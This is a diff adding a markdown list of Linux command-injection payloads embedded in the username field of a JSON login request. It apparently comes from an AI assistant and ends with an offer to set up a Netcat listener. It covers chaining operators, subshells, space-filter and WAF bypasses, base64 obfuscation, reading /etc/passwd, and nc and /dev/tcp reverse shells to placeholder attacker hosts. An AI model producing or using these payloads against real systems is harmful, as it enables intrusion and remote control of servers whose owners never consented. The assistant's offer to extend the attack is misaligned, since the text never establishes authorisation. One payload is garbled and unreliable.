@@ -1,0 +1,80 @@
+Here is an exhaustive list of all distinct methods, operators, and formatting variations used to achieve Command Injection and RCE on a Linux (Bash/sh) backend.
+## 1. Alternative Command Chaining Operators
+If the server filters semicolons or double pipes, use these alternative command separators.
+
+* Sequential Execution (Newline): Useful if the backend passes input to a script line-by-line.
+
+{"password":"9012","username":"652223518\nsleep 10","rememberMe":false}
+
+* Background Process Execution (&): Executes the command concurrently without waiting for the first part.
+
+{"password":"9012","username":"652223518 & sleep 10 &","rememberMe":false}
+
+* Logical AND (&&): Executes the second command only if the first string evaluates as a successful command (unlikely here, but standard).
+
+{"password":"9012","username":"652223518 && sleep 10","rememberMe":false}
+
+* Pipe Operator (|): Passes the output of the first string into your command.
+
+{"password":"9012","username":"652223518 | sleep 10","rememberMe":false}
+
+
+## 2. Modern Inline Subshells (\$())
+If old-style backticks (`) are stripped or escaped by a Web Application Firewall (WAF), modern POSIX subshells bypass them.
+
+* Standard Subshell:
+
+{"password":"9012","username":"652223518$(sleep 10)","rememberMe":false}
+
+* Nested Subshell: Forces aggressive execution layers.
+
+{"password":"9012","username":"652223518$(co=$(sleep 10);$co)","rememberMe":false}
+
+
+## 3. Space-Filtering Bypasses
+Many systems filter out empty space characters ( ). Use these payloads to run commands without spaces.
+
+* Using the Internal Field Separator ($IFS):
+
+{"password":"9012","username":"652223518;sleep$IFS'10';","rememberMe":false}
+
+* Using $IFS with Braces:
+
+{"password":"9012","username":"652223518;{sleep,10};","rememberMe":false}
+
+* Using Redirection Operators: Forces the shell to parse arguments without spaces.
+
+{"password":"9012","username":"652223518;cat</etc/passwd;","rememberMe":false}
+
+
+## 4. Direct Reverse Shell Payloads (In-Band)
+If you do not want a blind time-delay and want to force the Linux server to connect back to your listening machine instantly.
+
+* Netcat (NC) Reverse Shell:
+
+{"password":"9012","username":"652223518; nc YOUR_IP YOUR_PORT -e /bin/sh;","rememberMe":false}
+
+* Bash Native Reverse Shell: Does not rely on Netcat being installed on the target.
+
+{"password":"9012","username":"652223518; bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1;","rememberMe":false}
+
+
+## 5. WAF Obfuscation & Character Bypasses
+If the application blocks explicit words like sleep, ping, or cat.
+
+* String Concatenation: Bypasses blacklists looking for the word "sleep".
+
+{"password":"9012","username":"652223518; sl'e'ep 10;","rememberMe":false}
+
+* Environment Variable Construction: Assembles commands from existing shell characters.
+
+{"password":"9012","username":"652223518; $u $sleep 10;","rememberMe":false}
+
+* Base64 Encoding Bypass: Encodes the entire Linux command (sleep 10 encodes to c2xlZXAgMTA=) so the application backend never sees the text string.
+
+{"password":"9012","username":"652223518; echo c2xlZXAgMTA= | base64 -d | sh;","rememberMe":false}
+
+
+------------------------------
+Would you like help setting up a Netcat listener to receive a connection if one of these reverse shell payloads succeeds?
+
